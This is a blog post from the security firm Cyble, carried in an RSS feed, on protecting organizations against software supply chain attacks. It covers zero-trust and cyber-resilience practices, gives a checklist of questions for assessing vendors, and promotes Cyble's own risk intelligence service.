<p>The software supply chain falls under the broader category of third-party risk management (TPRM), the partners, vendors, service providers, suppliers and contractors who can unwittingly introduce risk into an organization’s environment. A number of studies have found that more than half of all organizations have experienced a third-party breach, and these breaches tend to be more costly than incidents that occur within an organization.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Here are some of the best practices and technologies organizations can use to protect against these growing third-party risks.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Zero Trust and Cyber Resilience Help Control Supply Chain Risks&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity,</a> organizations should always “assume breach” and trust no one, and this applies to third-party partners too. If security teams assume that no one can be trusted and that no one can be given safe access to assets, they architect accordingly, with critical systems and data isolated with security controls and duplicated with ransomware-resistant backups.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The concept of <em>cyber resilience</em> has been repeatedly stressed in recent years. Instead of focusing solely on the network perimeter and endpoints, resilience and recovery should be built around critical applications and data using practices such as:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Network microsegmentation&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Strong access controls, allowing no more access than is required, with frequent verification&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>A strong source of user identity and authentication, including multi-factor authentication and biometrics, <em>and</em> machine authentication with device compliance and health checks&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Encryption of data at rest and in transit&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Ransomware-resistant backups that are immutable, air-gapped and isolated as much as possible&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Honeypots that lure attackers to fake assets for early breach detection&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Proper configuration of API and cloud service connections&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Monitor for unusual activity with SIEM, Active Directory monitoring, and data loss prevention (DLP) tools&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Routinely assessing and confirming controls through audits, vulnerability scanning and penetration tests&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Best Practices for Secure Development – and Third-Party Risk Management&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Ideally, the most effective place to control software supply chain risks is in the continuous integration and development (CI/CD) process – and customers of these services also have a role to play here.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Carefully vetting your partners and suppliers and requiring good security controls in contracts are ways to improve third-party security. <a href="https://cyble.com/solutions/cyber-threat-intelligence/">Cyber threat intelligence</a> services like Cyble will help you assess partner and vendor risk – and alert you to places where you may want to shore up your own security defenses. Cyble’s third-party risk intelligence module evaluates partner security in areas such as cyber hygiene, dark web exposure, spoofing activities, and attack surface and network exposure, noting specific areas for improvement, while Cyble’s AI-powered vulnerability scanning capabilities can help you find and prioritize your own web-facing vulnerabilities.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The U.S. National Institute of Standards and Technology (NIST) offers a number of guides on supply chain risk management and best practices. These are important resources both for developers and companies evaluating third-party providers. Make security reviews and requirements part of your procurement process from the start.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Here are some questions you should ask vendors and service providers as part of a digital supply chain risk assessment:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Is the vendor’s software and hardware design process documented, repeatable and measurable?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Does the vendor maintain a software component inventory such as a software bill of materials (SBOM) that spells out the components and other attributes of software developed by the vendor and third parties?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Is the mitigation of known vulnerabilities factored into product design through product architecture, run-time protection techniques, and code review?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How does the vendor stay current on emerging vulnerabilities? What are vendor capabilities to address new <a href="https://cyble.com/knowledge-hub/zero-day-exploit/">“zero day” vulnerabilities?</a>&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What controls are in place to manage and monitor production processes?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How is configuration management performed? Quality assurance? How is testing done for code quality and vulnerabilities?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What levels of <a href="https://cyble.com/knowledge-hub/what-is-malware/">malware </a>protection and detection are performed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What steps are taken to make sure products are tamper-proof? Are the back doors closed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Are physical security measures documented and audited?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What access controls, both cyber and physical, are in place? Are they documented and audited?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How is customer data protected, stored, retained, and destroyed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What type of employee background checks are conducted and how frequently?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>What security practice expectations are there for upstream suppliers, and how is adherence to these standards assessed?&nbsp;</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>How secure is the distribution process? Have approved and authorized distribution channels been clearly documented?&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>Services like Cyble’s third-party risk intelligence can help you get started on this process. As more organizations make security a buying criterion, vendors will be forced to respond with better security controls and documentation.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/surge-in-software-supply-chain-attacks-heightens-third-party-vigilance/" rel="nofollow">Surge in Software Supply Chain Attacks Demands Heightened Third-Party Vigilance</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Tue, 20 Aug 2024 16:57:13 +0000</pubDate>
</item>
</channel>
</rss>